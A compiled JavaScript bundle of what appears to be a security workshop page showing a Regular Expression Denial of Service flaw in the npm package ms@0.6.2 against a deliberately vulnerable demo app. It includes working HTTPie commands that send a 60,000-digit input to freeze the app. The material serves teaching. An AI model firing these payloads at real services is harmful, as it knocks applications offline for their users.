{"code":"(window.webpackJsonp=window.webpackJsonp||[]).push([[363],{761:function(t,e,s){\"use strict\";s.r(e);var a=s(56),n=Object(a.a)({},(function(){var t=this,e=t.$createElement,s=t._self._c||e;return s(\"ContentSlotsDistributor\",{attrs:{\"slot-key\":t.$parent.slotKey}},[s(\"h1\",{attrs:{id:\"example-3\"}},[s(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#example-3\"}},[t._v(\"#\")]),t._v(\" Example 3\")]),t._v(\" \"),s(\"p\",[t._v(\"Our third example vulnerability is with the \"),s(\"a\",{attrs:{href:\"https://www.npmjs.com/package/ms\",target:\"_blank\",rel:\"noopener noreferrer\"}},[s(\"code\",[t._v(\"ms\")]),s(\"OutboundLink\")],1),t._v(\" \"),s(\"a\",{attrs:{href:\"https://www.npmjs.com/\",target:\"_blank\",rel:\"noopener noreferrer\"}},[t._v(\"npm\"),s(\"OutboundLink\")],1),t._v(\" package. This is a module that allows easy conversion of various time formats into milliseconds. The issue here is that we are using \"),s(\"code\",[t._v(\"ms@0.6.2\")]),t._v(\" and this has a \"),s(\"a\",{attrs:{href:\"https://snyk.io/test/npm/ms/0.6.2\",target:\"_blank\",rel:\"noopener noreferrer\"}},[t._v(\"Regular Expression Denial of Service (ReDos)\"),s(\"OutboundLink\")],1),t._v(\" vulnerability.\")]),t._v(\" \"),s(\"p\",[s(\"img\",{attrs:{src:\"https://partner-workshop-assets.s3.us-east-2.amazonaws.com/vuln_ms.png\",alt:\"\"}})]),t._v(\" \"),s(\"p\",[t._v(\"What this package allows us to do is to take a string input and parse into milliseconds which our application will then use to send a reminder. For example:\")]),t._v(\" \"),s(\"p\",[s(\"img\",{attrs:{src:\"http://g.recordit.co/tgye3UMxmo.gif\",alt:\"\"}})]),t._v(\" \"),s(\"p\",[t._v(\"To demonstrate this vulnerability, we will move to the terminal. Let's run the following command against our application:\")]),t._v(\" \"),s(\"div\",{staticClass:\"language-text extra-class\"},[s(\"pre\",{pre:!0,attrs:{class:\"language-text\"}},[s(\"code\",[t._v(\"echo 'content=Reboot server in 20 minutes' | http --form $GOOF_HOST/create -v\\n\")])])]),s(\"p\",[t._v(\"ï¿½The result will be console output similar to this:\")]),t._v(\" \"),s(\"div\",{staticClass:\"language-text extra-class\"},[s(\"pre\",{pre:!0,attrs:{class:\"language-text\"}},[s(\"code\",[t._v('POST /create HTTP/1.1\\nAccept: */*\\nAccept-Encoding: gzip, deflate\\nConnection: keep-alive\\nContent-Length: 36\\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\\nHost: elb.amazonaws.com\\nUser-Agent: HTTPie/2.1.0\\n\\ncontent=Reboot server in 20 minutes\\n\\nHTTP/1.1 302 Found\\nConnection: keep-alive\\nContent-Length: 28\\nContent-Type: text/html; charset=utf-8\\nDate: Sat, 13 Jun 2020 21:20:16 GMT\\nETag: W/\"1c-41a86905\"\\nLocation: /\\nVary: X-HTTP-Method-Override\\nX-Powered-By: Express\\n\\nUmVib290IHNlcnZlciBbMjBtXQ==\\n')])])]),s(\"p\",[t._v(\"A corresponding web result will look like this:\")]),t._v(\" \"),s(\"p\",[s(\"img\",{attrs:{src:\"https://partner-workshop-assets.s3.us-east-2.amazonaws.com/goof_ms_01.png\",alt:\"\"}})]),t._v(\" \"),s(\"p\",[t._v(\"Now we will take the previous command but print the digit 5 a total of 60,000 times. This regular expression will take a non-linear amount of time to process an input. The longer the input, the longer the processing time. Let's run the following command\")]),t._v(\" \"),s(\"div\",{staticClass:\"language-bash extra-class\"},[s(\"pre\",{pre:!0,attrs:{class:\"language-bash\"}},[s(\"code\",[s(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[t._v(\"echo\")]),t._v(\" \"),s(\"span\",{pre:!0,attrs:{class:\"token string\"}},[t._v(\"'content=Reboot server in '\")]),s(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"\\\\\")]),s(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[s(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[t._v(\"`\")]),s(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[t._v(\"printf\")]),t._v(\" \"),s(\"span\",{pre:!0,attrs:{class:\"token string\"}},[t._v('\"%.0s5\"')]),t._v(\" \"),s(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"{\")]),s(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"1\")]),s(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"..\")]),s(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"60000\")]),s(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"}\")]),s(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"\\\\\")]),s(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[t._v(\"`\")])]),s(\"span\",{pre:!0,attrs:{class:\"token string\"}},[t._v(\"' minutes'\")]),t._v(\" \"),s(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"|\")]),t._v(\" http --form \"),s(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[t._v(\"$GOOF_HOST\")]),t._v(\"/create -v\\n\")])])]),s(\"p\",[t._v(\"The result here was surprisingly fast. However, what happens when the regular expression does not match? To illustrate this, let's take the same command and swap the \"),s(\"em\",[s(\"strong\",[t._v(\"s\")])]),t._v(\" in \"),s(\"em\",[s(\"strong\",[t._v(\"minutes\")])]),t._v(\" for an \"),s(\"em\",[s(\"strong\",[t._v(\"a\")])]),t._v(\" instead. Type the following command:\")]),t._v(\" \"),s(\"div\",{staticClass:\"language-bash extra-class\"},[s(\"pre\",{pre:!0,attrs:{class:\"language-bash\"}},[s(\"code\",[s(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[t._v(\"echo\")]),t._v(\" \"),s(\"span\",{pre:!0,attrs:{class:\"token string\"}},[t._v(\"'content=Reboot server in '\")]),s(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"\\\\\")]),s(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[s(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[t._v(\"`\")]),s(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[t._v(\"printf\")]),t._v(\" \"),s(\"span\",{pre:!0,attrs:{class:\"token string\"}},[t._v('\"%.0s5\"')]),t._v(\" \"),s(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"{\")]),s(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"1\")]),s(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"..\")]),s(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"60000\")]),s(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"}\")]),s(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"\\\\\")]),s(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[t._v(\"`\")])]),s(\"span\",{pre:!0,attrs:{class:\"token string\"}},[t._v(\"' minutea'\")]),t._v(\" \"),s(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"|\")]),t._v(\" http --form \"),s(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[t._v(\"$GOOF_HOST\")]),t._v(\"/create -v\\n\")])])]),s(\"p\",[t._v(\"This command will take a while to process and result in a non-responsive application. If you try to add or remove tasks the application will not respond and you have blocked legitimate requests from processing.\")])])}),[],!1,null,null,null);e.default=n.exports}}]);","extractedComments":[]}